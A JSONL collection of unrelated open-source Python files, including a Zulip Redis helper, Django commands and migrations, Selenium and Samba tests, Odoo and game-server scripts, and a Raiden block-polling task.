{"text": "from django.conf import settings\nfrom typing import Any, Dict, Optional\nfrom zerver.lib.utils import generate_random_token\n\nimport re\nimport redis\nimport ujson\n\n# Redis accepts keys up to 512MB in size, but there's no reason for us to use such size,\n# so we want to stay limited to 1024 characters.\nMAX_KEY_LENGTH = 1024\n\nclass ZulipRedisError(Exception):\n    pass\n\nclass ZulipRedisKeyTooLongError(ZulipRedisError):\n    pass\n\nclass ZulipRedisKeyOfWrongFormatError(ZulipRedisError):\n    pass\n\ndef get_redis_client() -> redis.StrictRedis:\n    return redis.StrictRedis(host=settings.REDIS_HOST, port=settings.REDIS_PORT,\n                             password=settings.REDIS_PASSWORD, db=0)\n\ndef put_dict_in_redis(redis_client: redis.StrictRedis, key_format: str,\n                      data_to_store: Dict[str, Any],\n                      expiration_seconds: int,\n                      token_length: int=64) -> str:\n    key_length = len(key_format) - len('{token}') + token_length\n    if key_length > MAX_KEY_LENGTH:\n        error_msg = \"Requested key too long in put_dict_in_redis. Key format: %s, token length: %s\"\n        raise ZulipRedisKeyTooLongError(error_msg % (key_format, token_length))\n    token = generate_random_token(token_length)\n    key = key_format.format(token=token)\n    with redis_client.pipeline() as pipeline:\n        pipeline.set(key, ujson.dumps(data_to_store))\n        pipeline.expire(key, expiration_seconds)\n        pipeline.execute()\n\n    return key\n\ndef get_dict_from_redis(redis_client: redis.StrictRedis, key_format: str, key: str\n                        ) -> Optional[Dict[str, Any]]:\n    # This function requires inputting the intended key_format to validate\n    # that the key fits it, as an additionally security measure. This protects\n    # against bugs where a caller requests a key based on user input and doesn't\n    # validate it - which could potentially allow users to poke around arbitrary redis keys.\n    if len(key) > MAX_KEY_LENGTH:\n        error_msg = \"Requested key too long in get_dict_from_redis: %s\"\n        raise ZulipRedisKeyTooLongError(error_msg % (key,))\n    validate_key_fits_format(key, key_format)\n\n    data = redis_client.get(key)\n    if data is None:\n        return None\n    return ujson.loads(data)\n\ndef validate_key_fits_format(key: str, key_format: str) -> None:\n    assert \"{token}\" in key_format\n    regex = key_format.format(token=r\"[a-z0-9]+\")\n\n    if not re.fullmatch(regex, key):\n        raise ZulipRedisKeyOfWrongFormatError(\"%s does not match format %s\" % (key, key_format))\n"}
{"text": "\"\"\"\n    'Contrary to what people may say, there is no upper limit to stupidity.'\n                    - Stephen Colbert\n\n\"\"\"\n\nfrom optparse import make_option\n\nfrom django.conf import settings\nfrom django.core.management.base import BaseCommand, CommandError\n\nfrom dpn.data.models import Node\nfrom dpn.client.tasks import accept_transfers\n\nclass Command(BaseCommand):\n    help = 'Pulls registry entries from all nodes or named node only if ' \\\n           'specified.'\n\n    option_list = BaseCommand.option_list + (\n        make_option(\"--node\",\n            dest=\"namespace\",\n            default=None,\n            help=\"Namespace of specific node to pull registry entries from.\"\n        ),\n        make_option(\"--max\",\n                    dest=\"max\",\n                    default=settings.DPN_MAX_ACCEPT,\n                    help=\"Max number of transfer to mark as accepted at once.\"\n                    )\n    )\n\n    def handle(self, *args, **options):\n        nodes = Node.objects.exclude(api_root__isnull=True).exclude(\n                api_root__exact='').exclude(namespace=settings.DPN_NAMESPACE)\n        nodes = nodes.filter(replicate_from=True)\n        if options['namespace']:\n            nodes.filter(namespace=options['namespace'])\n\n        if not nodes:\n            raise CommandError(\"No nodes found to query.\")\n\n        for node in nodes:\n            accept_transfers(node, options['max'])\n            self.stdout.write(\"Done accepting transfers from %s\" %\n                              node.namespace)"}
{"text": "from __future__ import print_function\nimport sys, argparse, selenium, contextlib, os, json, traceback\nfrom datetime import datetime as DateTime\nfrom datetime import timedelta as TimeDelta\n\nfrom selenium.webdriver import Remote as WebDriverRemote\nfrom selenium.webdriver.support.ui import WebDriverWait\n\nclass SelenibenchCli(object):\n    \"\"\"Downloads timings from the web performance api.\"\"\"\n\n    def __init__(self, argv):\n        self.argv = argv\n\n    def run(self):\n        parser = self.get_parser()\n        settings = self.get_settings(parser)\n\n        if settings.log_json:\n            io = open(settings.log_json, 'w')\n        else:\n            io = None\n\n        runs = 0\n        contiguous_failures = 0\n\n        while runs < settings.number:\n            runs += 1\n\n            remote = WebDriverRemote(command_executor=settings.webdriver,\n                                     desired_capabilities=settings.capabilities)\n            with contextlib.closing(remote) as driver:\n                try:\n                    driver.get(settings.url[0])\n                    self.find_load_times(driver, io)\n                    contiguous_failures = 0\n                except:\n                    if contiguous_failures > 3:\n                        print(\"Failure getting load times.  Giving up.\")\n                        raise\n\n                    contiguous_failures += 1\n                    runs -= 1\n                    print(\"Failure getting load times.  Will try again.\")\n                    traceback.print_ex()\n\n        return 0\n\n    def find_load_times(self, driver, log):\n        def is_loaded(driver):\n            return driver.execute_script(\"return (document.readyState == 'complete')\")\n        WebDriverWait(driver, 15).until(is_loaded)\n\n        timings = driver.execute_script(\"return window.performance.timing\")\n\n        times = {}\n        for key, value in timings.iteritems():\n            if not isinstance(value, int):\n                continue\n\n            if value in (True, False):\n                continue\n\n            value = str(value)\n            unixey = int(value[0:10])\n\n            if value[10:]:\n                ms = int(value[10:])\n            else:\n                ms = 0\n\n            converted = DateTime.fromtimestamp(unixey)\n            converted += TimeDelta(milliseconds=ms)\n\n            times[key] = converted\n\n        # This kind of thing really needs unit tests.  The thing takes so long\n        # to run it's just going to break horribly.\n        if log:\n            serialisable = dict(\n                    (key, value.isoformat())\n                    for key, value in times.iteritems())\n            log.write(json.dumps(serialisable))\n            log.write(\"\\n\")\n\n        print(times)\n\n    def get_parser(self):\n        parser = argparse.ArgumentParser()\n        parser.add_argument(\"url\", nargs=\"+\")\n        parser.add_argument(\"-w\", \"--webdriver\", required=True,\n                            help=\"Location to hub or webdriver.\")\n        parser.add_argument(\"-c\", \"--capabilities\", action=\"append\", default=[],\n                            help=\"Add a capability.\")\n        parser.add_argument(\"-n\", \"--number\", type=int, default=1,\n                            help=\"How many requests to run.\")\n        parser.add_argument(\"-j\", \"--log-json\", default=None,\n                            help=\"Log json per-line for each hit.\")\n        return parser\n\n    def get_settings(self, parser):\n        settings =  parser.parse_args(self.argv[1:])\n\n        capabilities = {'browserName': \"firefox\"}\n\n        for capability in settings.capabilities:\n            name, value = capability.split(\"=\")\n            capabilities[name.strip()] = value.strip()\n\n        settings.capabilities = capabilities\n\n        return settings\n\ndef selenibench_main():\n    \"\"\"Command-line entry point.\"\"\"\n    cli = SelenibenchCli(sys.argv)\n    sys.exit(cli.run())\n"}
{"text": "# -*- coding: utf-8 -*-\n# Copyright 2016 Antonio Espinosa <antonio.espinosa@tecnativa.com>\n# Copyright 2014-2017 Tecnativa - Pedro M. Baeza <pedro.baeza@tecnativa.com>\n# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl\n\nfrom openerp import models, fields, api, exceptions, _\n\n\nclass L10nEsAeatMapTax(models.Model):\n    _name = 'l10n.es.aeat.map.tax'\n\n    date_from = fields.Date(string=\"From Date\")\n    date_to = fields.Date(string=\"To Date\")\n    map_line_ids = fields.One2many(\n        comodel_name='l10n.es.aeat.map.tax.line',\n        inverse_name='map_parent_id', string=\"Map lines\", required=True)\n    model = fields.Integer(string=\"AEAT Model\", required=True)\n\n    @api.multi\n    @api.constrains('date_from', 'date_to')\n    def _unique_date_range(self):\n        for map in self:\n            domain = [('id', '!=', map.id)]\n            if map.date_from and map.date_to:\n                domain += ['|', '&',\n                           ('date_from', '<=', map.date_to),\n                           ('date_from', '>=', map.date_from),\n                           '|', '&',\n                           ('date_to', '<=', map.date_to),\n                           ('date_to', '>=', map.date_from),\n                           '|', '&',\n                           ('date_from', '=', False),\n                           ('date_to', '>=', map.date_from),\n                           '|', '&',\n                           ('date_to', '=', False),\n                           ('date_from', '<=', map.date_to),\n                           ]\n            elif map.date_from:\n                domain += [('date_to', '>=', map.date_from)]\n            elif map.date_to:\n                domain += [('date_from', '<=', map.date_to)]\n            date_lst = map.search(domain)\n            if date_lst:\n                raise exceptions.Warning(\n                    _(\"Error! The dates of the record overlap with an \"\n                      \"existing record.\")\n                )\n\n    @api.multi\n    def name_get(self):\n        vals = []\n        for record in self:\n            name = \"%s\" % record.model\n            if record.date_from or record.date_to:\n                name += \" (%s-%s)\" % (\n                    record.date_from and\n                    fields.Date.from_string(record.date_from) or '',\n                    record.date_to and\n                    fields.Date.from_string(record.date_to) or '')\n            vals.append(tuple([record.id, name]))\n        return vals\n"}
{"text": "#\n#  The Multiverse Platform is made available under the MIT License.\n#\n#  Copyright (c) 2012 The Multiverse Foundation\n#\n#  Permission is hereby granted, free of charge, to any person \n#  obtaining a copy of this software and associated documentation \n#  files (the \"Software\"), to deal in the Software without restriction, \n#  including without limitation the rights to use, copy, modify, \n#  merge, publish, distribute, sublicense, and/or sell copies \n#  of the Software, and to permit persons to whom the Software \n#  is furnished to do so, subject to the following conditions:\n#\n#  The above copyright notice and this permission notice shall be \n#  included in all copies or substantial portions of the Software.\n# \n#  THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, \n#  EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES \n#  OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND \n#  NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT \n#  HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, \n#  WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING \n#  FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE \n#  OR OTHER DEALINGS IN THE SOFTWARE.\n#\n#\n\n\nfrom java.lang import Long\nfrom multiverse.server.plugins import *\nfrom multiverse.server.objects import *\n\n\ninstance = Instance.current()\ninstanceOid = Instance.currentOid()\n\n\nwolfMarker = instance.getMarker(\"wolfmarker\").clone()\nwolfMarker.getPoint().setY(0)\nspawnData = SpawnData()\nspawnData.setFactoryName(\"WolfFactory\")\nspawnData.setInstanceOid(Long(instanceOid))\nspawnData.setLoc(wolfMarker.getPoint())\nspawnData.setNumSpawns(3)\nspawnData.setSpawnRadius(20000)\nspawnData.setRespawnTime(60000)\nspawnData.setCorpseDespawnTime(30000)\nMobManagerClient.createSpawnGenerator(spawnData)\n\n\nzombieMarker = instance.getMarker(\"zombiemarker\").clone()\nzombieMarker.getPoint().setY(0)\nspawnData = SpawnData()\nspawnData.setFactoryName(\"ZombieFactory\")\nspawnData.setInstanceOid(Long(instanceOid))\nspawnData.setLoc(zombieMarker.getPoint())\nspawnData.setNumSpawns(2)\nspawnData.setSpawnRadius(30000)\nspawnData.setRespawnTime(60000)\nspawnData.setCorpseDespawnTime(30000)\nMobManagerClient.createSpawnGenerator(spawnData)\n\n\nnpc1Marker = instance.getMarker(\"npcmarker\").clone()\nnpc1Marker.getPoint().setY(0)\nspawnData = SpawnData()\nspawnData.setFactoryName(\"Npc1Factory\")\nspawnData.setInstanceOid(Long(instanceOid))\nspawnData.setLoc(npc1Marker.getPoint())\nspawnData.setOrientation(npc1Marker.getOrientation())\nspawnData.setNumSpawns(1)\nspawnData.setSpawnRadius(1)\nspawnData.setRespawnTime(5000)\nspawnData.setCorpseDespawnTime(0)\nMobManagerClient.createSpawnGenerator(spawnData)\n\n\nnpc2Marker = instance.getMarker(\"npcmarker\").clone()\nnpc2Marker.getPoint().setY(0)\nnpc2Marker.getPoint().add(3000, 0, 0)\nspawnData = SpawnData()\nspawnData.setFactoryName(\"Npc2Factory\")\nspawnData.setInstanceOid(Long(instanceOid))\nspawnData.setLoc(npc2Marker.getPoint())\nspawnData.setOrientation(npc2Marker.getOrientation())\nspawnData.setNumSpawns(1)\nspawnData.setSpawnRadius(1)\nspawnData.setRespawnTime(5000)\nspawnData.setCorpseDespawnTime(0)\nMobManagerClient.createSpawnGenerator(spawnData)\n\nsoldierTrainerMarker = instance.getMarker(\"npcmarker\").clone()\nsoldierTrainerMarker.getPoint().setY(0)\nsoldierTrainerMarker.getPoint().add(6000, 0, 0)\nspawndata = SpawnData()\nspawnData.setFactoryName(\"SoldierTrainerFactory\")\nspawnData.setInstanceOid(Long(instanceOid))\nspawnData.setLoc(soldierTrainerMarker.getPoint())\nspawnData.setOrientation(soldierTrainerMarker.getOrientation())\nspawnData.setNumSpawns(1)\nspawnData.setSpawnRadius(1)\nspawnData.setRespawnTime(5000)\nspawnData.setCorpseDespawnTime(0)\nMobManagerClient.createSpawnGenerator(spawnData)\n"}
{"text": "# Copyright 2016 Susan Bennett, David Mitchell, Jim Nicholls\n#\n# This file is part of AutoHolds.\n#\n# AutoHolds is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# AutoHolds is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with AutoHolds.  If not, see <http://www.gnu.org/licenses/>.\n#\n# -*- coding: utf-8 -*-\n# Generated by Django 1.9.4 on 2016-03-16 02:57\n\nfrom __future__ import unicode_literals\n\nfrom django.db import migrations, models\nimport django.db.models.deletion\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('patron', '0006_registration_language'),\n    ]\n\n    operations = [\n        migrations.AlterField(\n            model_name='registration',\n            name='format',\n            field=models.ForeignKey(on_delete=django.db.models.deletion.PROTECT, to='patron.Format'),\n        ),\n    ]\n"}
{"text": "from __future__ import absolute_import, print_function, unicode_literals\nimport os\n\"\"\"\nDeployment based configuration\n\nWhen deploying topology specify a deployment to match with a settings key.\n\n    -o \"'topology.deployment=\\\"local\\\"'\"\n\nSpouts / Bolts in the topolgoy will then pull the settings then need from this module\n\n\"\"\"\n\n\nALL_SETTINGS = {}\n\nALL_SETTINGS['cluster'] = {\n    'topology':'cluster',\n\n    'appid': 'datawake',\n    'crawler-in-topic' : 'datawake-crawler-input',\n    'crawler-out-topic' : 'datawake-crawler-out',\n    'visited-topic': 'datawake-visited',\n    'conn_pool' : \"\",\n    'crawler_conn_pool' : \"\",\n}\n\n\nALL_SETTINGS['local-docker'] = {\n    'topology':'local',\n\n    'appid': 'datawake',\n    'crawler-in-topic' : 'datawake-crawler-input',\n    'crawler-out-topic' : 'datawake-crawler-out',\n    'visited-topic': 'datawake-visited',\n    'conn_pool' : os.environ['KAFKA_PORT_9092_TCP_ADDR']+\":9092\" if 'KAFKA_PORT_9092_TCP_ADDR' in os.environ else '',\n    'crawler_conn_pool' : os.environ['KAFKA_PORT_9092_TCP_ADDR']+\":9092\" if 'KAFKA_PORT_9092_TCP_ADDR' in os.environ else '',\n    'user':'root',\n    'database':'datawake_prefetch',\n    'password':os.environ['MYSQL_ENV_MYSQL_ROOT_PASSWORD'] if 'MYSQL_ENV_MYSQL_ROOT_PASSWORD' in os.environ else '',\n    'host':os.environ['MYSQL_PORT_3306_TCP_ADDR'] if 'MYSQL_PORT_3306_TCP_ADDR' in os.environ else ''\n}\n\n\n\ndef get_settings(key):\n    return ALL_SETTINGS[key]\n"}
{"text": "from django.conf import settings\nfrom django.core.urlresolvers import reverse\n\nimport mock\nfrom nose import SkipTest\nfrom nose.tools import eq_\n\nimport amo\nfrom lib.crypto import packaged\nfrom lib.crypto.tests import mock_sign\nfrom mkt.site.fixtures import fixture\nfrom mkt.submit.tests.test_views import BasePackagedAppTest\n\n\nclass TestDownload(BasePackagedAppTest):\n    fixtures = fixture('webapp_337141', 'user_999',\n                       'user_admin', 'group_admin', 'user_admin_group')\n\n    def setUp(self):\n        super(TestDownload, self).setUp()\n        super(TestDownload, self).setup_files()\n        self.url = reverse('downloads.file', args=[self.file.pk])\n\n    @mock.patch.object(packaged, 'sign', mock_sign)\n    def test_download(self):\n        if not settings.XSENDFILE:\n            raise SkipTest\n        res = self.client.get(self.url)\n        eq_(res.status_code, 200)\n        assert settings.XSENDFILE_HEADER in res\n\n    def test_disabled(self):\n        self.app.update(status=amo.STATUS_DISABLED)\n        eq_(self.client.get(self.url).status_code, 404)\n\n    def test_not_public(self):\n        self.file.update(status=amo.STATUS_PENDING)\n        eq_(self.client.get(self.url).status_code, 404)\n\n    @mock.patch('lib.crypto.packaged.sign')\n    def test_not_public_but_owner(self, sign):\n        self.client.login(username='steamcube@mozilla.com',\n                          password='password')\n        self.file.update(status=amo.STATUS_PENDING)\n        eq_(self.client.get(self.url).status_code, 200)\n        assert not sign.called\n\n    @mock.patch('lib.crypto.packaged.sign')\n    def test_not_public_not_owner(self, sign):\n        self.client.login(username='regular@mozilla.com',\n                          password='password')\n        self.file.update(status=amo.STATUS_PENDING)\n        eq_(self.client.get(self.url).status_code, 404)\n\n    @mock.patch.object(packaged, 'sign', mock_sign)\n    def test_disabled_but_owner(self):\n        self.client.login(username='steamcube@mozilla.com',\n                          password='password')\n        eq_(self.client.get(self.url).status_code, 200)\n\n    @mock.patch.object(packaged, 'sign', mock_sign)\n    def test_disabled_but_admin(self):\n        self.client.login(username='admin@mozilla.com',\n                          password='password')\n        eq_(self.client.get(self.url).status_code, 200)\n\n    def test_not_webapp(self):\n        self.app.update(type=amo.ADDON_EXTENSION)\n        eq_(self.client.get(self.url).status_code, 404)\n\n    @mock.patch.object(packaged, 'sign', mock_sign)\n    def test_file_blocklisted(self):\n        if not settings.XSENDFILE:\n            raise SkipTest\n        self.file.update(status=amo.STATUS_BLOCKED)\n        res = self.client.get(self.url)\n        eq_(res.status_code, 200)\n        assert settings.XSENDFILE_HEADER in res\n\n    def test_has_cors(self):\n        self.assertCORS(self.client.get(self.url), 'get')\n"}
{"text": "#! /usr/bin/python -tt\n\nimport nose\n\nfrom rhuilib.util import *\nfrom rhuilib.rhui_testcase import *\nfrom rhuilib.rhuimanager import *\nfrom rhuilib.rhuimanager_cds import *\nfrom rhuilib.rhuimanager_repo import *\nfrom rhuilib.pulp_admin import PulpAdmin\nfrom rhuilib.cds import RhuiCds\n\n\nclass test_tcms_178464(RHUITestcase):\n    def _setup(self):\n        '''[TCMS#178464 setup] Do initial rhui-manager run'''\n        RHUIManager.initial_run(self.rs.Instances[\"RHUA\"][0])\n\n        '''[TCMS#178464 setup] Add cds '''\n        RHUIManagerCds.add_cds(self.rs.Instances[\"RHUA\"][0], \"Cluster1\", self.rs.Instances[\"CDS\"][0].private_hostname)\n\n        '''[TCMS#178464 setup] Create custom repo '''\n        RHUIManagerRepo.add_custom_repo(self.rs.Instances[\"RHUA\"][0], \"repo1\")\n\n        '''[TCMS#178464 setup] Associate repos with clusters '''\n        RHUIManagerCds.associate_repo_cds(self.rs.Instances[\"RHUA\"][0], \"Cluster1\", [\"repo1\"])\n\n    def _test(self):\n        '''[TCMS#178464 test] Check cds info screen '''\n        cds = RhuiCds(\n                hostname=self.rs.Instances[\"CDS\"][0].private_hostname,\n                cluster=\"Cluster1\",\n                repos=[\"repo1\"]\n                )\n        nose.tools.assert_equal(RHUIManagerCds.info(self.rs.Instances[\"RHUA\"][0], [\"Cluster1\"]), [cds])\n\n        '''[TCMS#178464 test] Check pulp-admin cds list '''\n        nose.tools.assert_equals(PulpAdmin.cds_list(self.rs.Instances[\"RHUA\"][0]),\n                RHUIManagerCds.info(self.rs.Instances[\"RHUA\"][0], [\"Cluster1\"]))\n\n        '''[TCMS#178464 test] Check certs created for custom repo '''\n        Expect.ping_pong(self.rs.Instances[\"RHUA\"][0], \"test -f /etc/pki/pulp/content/repo1/consumer-repo1.cert && echo SUCCESS\", \"[^ ]SUCCESS\")\n        Expect.ping_pong(self.rs.Instances[\"RHUA\"][0], \"test -f /etc/pki/pulp/content/repo1/consumer-repo1.ca && echo SUCCESS\", \"[^ ]SUCCESS\")\n\n    def _cleanup(self):\n        '''[TCMS#178464 cleanup] Remove cds '''\n        RHUIManagerCds.delete_cds(self.rs.Instances[\"RHUA\"][0], \"Cluster1\", [self.rs.Instances[\"CDS\"][0].private_hostname])\n\n        '''[TCMS#178464 cleanup] Delete custom repos '''\n        RHUIManagerRepo.delete_repo(self.rs.Instances[\"RHUA\"][0], [\"repo1\"])\n\n\nif __name__ == \"__main__\":\n    nose.run(defaultTest=__name__, argv=[__file__, '-v'])\n"}
{"text": "\"\"\"\nFlask-XUACompatible\n-------------------\n\nThis is a simple Flask extension that sets X-UA-Compatible HTTP header for\nall responses.\n\"\"\"\n\nfrom setuptools import setup\n\n\nsetup(\n    name='flask-xuacompatible',\n    version='0.1.0',\n    url='https://github.com/jpvanhal/flask-xuacompatible',\n    license='BSD',\n    author='Janne Vanhala',\n    author_email='janne.vanhala@gmail.com',\n    description='Sets X-UA-Compatible HTTP header in your Flask application.',\n    long_description=__doc__,\n    py_modules=['flask_xuacompatible'],\n    zip_safe=False,\n    include_package_data=True,\n    platforms='any',\n    install_requires=['Flask'],\n    test_suite='test_xuacompatible.suite',\n    classifiers=[\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ]\n)\n"}
{"text": "#\n# This file is part of Mapnik (c++ mapping toolkit)\n#\n# Copyright (C) 2006 Artem Pavlenko, Jean-Francois Doyon\n#\n# Mapnik is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA\n#\n# $Id$\n\nimport os\nimport glob\nfrom copy import copy\n\nImport ('env')\n\nprogram_env = env.Clone()\n\nsource = Split(\n    \"\"\"\n    svg2png.cpp\n    \"\"\"\n    )\n\nheaders = env['CPPPATH'] \n\nlibraries =  copy(env['LIBMAPNIK_LIBS'])\nboost_program_options = 'boost_program_options%s' % env['BOOST_APPEND']\nlibraries.extend([boost_program_options,'mapnik'])\n\nsvg2png = program_env.Program('svg2png', source, CPPPATH=headers, LIBS=libraries, LINKFLAGS=env['CUSTOM_LDFLAGS'])\n\nDepends(svg2png, env.subst('../../src/%s' % env['MAPNIK_LIB_NAME']))\n\nif 'uninstall' not in COMMAND_LINE_TARGETS:\n    env.Install(os.path.join(env['INSTALL_PREFIX'],'bin'), svg2png)\n    env.Alias('install', os.path.join(env['INSTALL_PREFIX'],'bin'))\n\nenv['create_uninstall_target'](env, os.path.join(env['INSTALL_PREFIX'],'bin','svg2png'))\n"}
{"text": "# -*- coding: utf-8 -*-\nimport time\n\nfrom ethereum import slogging\n\nimport gevent\nfrom gevent.event import AsyncResult\nfrom gevent.queue import (\n    Queue,\n)\n\nREMOVE_CALLBACK = object()\nlog = slogging.get_logger(__name__)  # pylint: disable=invalid-name\n\n\nclass Task(gevent.Greenlet):\n    \"\"\" Base class used to created tasks.\n\n    Note:\n        Always call super().__init__().\n    \"\"\"\n\n    def __init__(self):\n        super(Task, self).__init__()\n        self.response_queue = Queue()\n\n\nclass AlarmTask(Task):\n    \"\"\" Task to notify when a block is mined. \"\"\"\n\n    def __init__(self, chain):\n        super(AlarmTask, self).__init__()\n\n        self.callbacks = list()\n        self.stop_event = AsyncResult()\n        self.chain = chain\n        self.last_block_number = None\n\n        # TODO: Start with a larger wait_time and decrease it as the\n        # probability of a new block increases.\n        self.wait_time = 0.5\n        self.last_loop = time.time()\n\n    def register_callback(self, callback):\n        \"\"\" Register a new callback.\n\n        Note:\n            The callback will be executed in the AlarmTask context and for\n            this reason it should not block, otherwise we can miss block\n            changes.\n        \"\"\"\n        if not callable(callback):\n            raise ValueError('callback is not a callable')\n\n        self.callbacks.append(callback)\n\n    def remove_callback(self, callback):\n        \"\"\"Remove callback from the list of callbacks if it exists\"\"\"\n        if callback in self.callbacks:\n            self.callbacks.remove(callback)\n\n    def _run(self):  # pylint: disable=method-hidden\n        log.debug('starting block number', block_number=self.last_block_number)\n\n        sleep_time = 0\n        while self.stop_event.wait(sleep_time) is not True:\n            self.poll_for_new_block()\n\n            # we want this task to iterate in the tick of `wait_time`, so take\n            # into account how long we spent executing one tick.\n            self.last_loop = time.time()\n            work_time = self.last_loop - self.last_loop\n            if work_time > self.wait_time:\n                log.warning(\n                    'alarm loop is taking longer than the wait time',\n                    work_time=work_time,\n                    wait_time=self.wait_time,\n                )\n                sleep_time = 0.001\n            else:\n                sleep_time = self.wait_time - work_time\n\n        # stopping\n        self.callbacks = list()\n\n    def poll_for_new_block(self):\n        current_block = self.chain.block_number()\n\n        if current_block > self.last_block_number + 1:\n            difference = current_block - self.last_block_number - 1\n            log.error(\n                'alarm missed %s blocks',\n                difference,\n            )\n\n        if current_block != self.last_block_number:\n            log.debug(\n                'new block',\n                number=current_block,\n                timestamp=self.last_loop,\n            )\n\n            self.last_block_number = current_block\n            remove = list()\n            for callback in self.callbacks:\n                try:\n                    result = callback(current_block)\n                except:  # pylint: disable=bare-except\n                    log.exception('unexpected exception on alarm')\n                else:\n                    if result is REMOVE_CALLBACK:\n                        remove.append(callback)\n\n            for callback in remove:\n                self.callbacks.remove(callback)\n\n    def start(self):\n        self.last_block_number = self.chain.block_number()\n        super(AlarmTask, self).start()\n\n    def stop_and_wait(self):\n        self.stop_event.set(True)\n        gevent.wait(self)\n\n    def stop_async(self):\n        self.stop_event.set(True)\n"}
{"text": "# Blackbox tests for the smbcontrol fault injection commands\n#\n# Copyright (C) Andrew Bartlett <abartlet@samba.org> 2018\n#\n# This program is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation; either version 3 of the License, or\n# (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n# As the test terminates and sleeps samba processes these tests need to run\n# in the preforkrestartdc test environment to prevent them impacting other\n# tests.\n#\nfrom __future__ import print_function\nimport time\nfrom samba.tests import BlackboxTestCase, BlackboxProcessError\nfrom samba.messaging import Messaging\n\nCOMMAND = \"bin/smbcontrol\"\nPING = \"ping\"\n\n\nclass SmbcontrolProcessBlockboxTests(BlackboxTestCase):\n\n    def setUp(self):\n        super(SmbcontrolProcessBlockboxTests, self).setUp()\n        lp_ctx = self.get_loadparm()\n        self.msg_ctx = Messaging(lp_ctx=lp_ctx)\n\n    def get_process_data(self):\n        services = self.msg_ctx.irpc_all_servers()\n\n        processes = []\n        for service in services:\n            for id in service.ids:\n                processes.append((service.name, id.pid))\n        return processes\n\n    def get_process(self, name):\n        processes = self.get_process_data()\n        for pname, pid in processes:\n            if name == pname:\n                return pid\n        return None\n\n    def test_inject_fault(self):\n        INJECT = \"inject\"\n        FAULT = \"segv\"\n        #\n        # Note that this process name needs to be different to the one used\n        # in the sleep test to avoid a race condition\n        #\n        pid = self.get_process(\"rpc_server\")\n\n        #\n        # Ensure we can ping the process before injecting a fault.\n        #\n        try:\n            self.check_run(\"%s %s %s\" % (COMMAND, pid, PING),\n                           msg=\"trying to ping rpc_server\")\n        except BlackboxProcessError as e:\n            self.fail(\"Unable to ping rpc_server process\")\n\n        #\n        # Now inject a fault.\n        #\n        try:\n            self.check_run(\"%s %s %s %s\" % (COMMAND, pid, INJECT, FAULT),\n                           msg=\"injecting fault into rpc_server\")\n        except BlackboxProcessError as e:\n            print(e)\n            self.fail(\"Unable to inject a fault into the rpc_server process\")\n\n        #\n        # The process should have died, so we should not be able to ping it\n        #\n        try:\n            self.check_run(\"%s %s %s\" % (COMMAND, pid, PING),\n                           msg=\"trying to ping rpc_server\")\n            self.fail(\"Could ping rpc_server process\")\n        except BlackboxProcessError as e:\n            pass\n\n    def test_sleep(self):\n        SLEEP = \"sleep\"  # smbcontrol sleep command\n        DURATION = 5     # duration to sleep server for\n        DELTA = 1        # permitted error for the sleep duration\n\n        #\n        # Note that this process name needs to be different to the one used\n        # in the inject fault test to avoid a race condition\n        #\n        pid = self.get_process(\"ldap_server\")\n        #\n        # Ensure we can ping the process before getting it to sleep\n        #\n        try:\n            self.check_run(\"%s %s %s\" % (COMMAND, pid, PING),\n                           msg=\"trying to ping rpc_server\")\n        except BlackboxProcessError as e:\n            self.fail(\"Unable to ping rpc_server process\")\n\n        #\n        # Now ask it to sleep\n        #\n        start = time.time()\n        try:\n            self.check_run(\"%s %s %s %s\" % (COMMAND, pid, SLEEP, DURATION),\n                           msg=\"putting rpc_server to sleep for %d\" % DURATION)\n        except BlackboxProcessError as e:\n            print(e)\n            self.fail(\"Failed to get rpc_server to sleep for %d\" % DURATION)\n\n        #\n        # The process should be sleeping and not respond until it wakes\n        #\n        try:\n            self.check_run(\"%s %s %s\" % (COMMAND, pid, PING),\n                           msg=\"trying to ping rpc_server\")\n            end = time.time()\n            duration = end - start\n            self.assertGreater(duration + DELTA, DURATION)\n        except BlackboxProcessError as e:\n            self.fail(\"Unable to ping rpc_server process\")\n"}
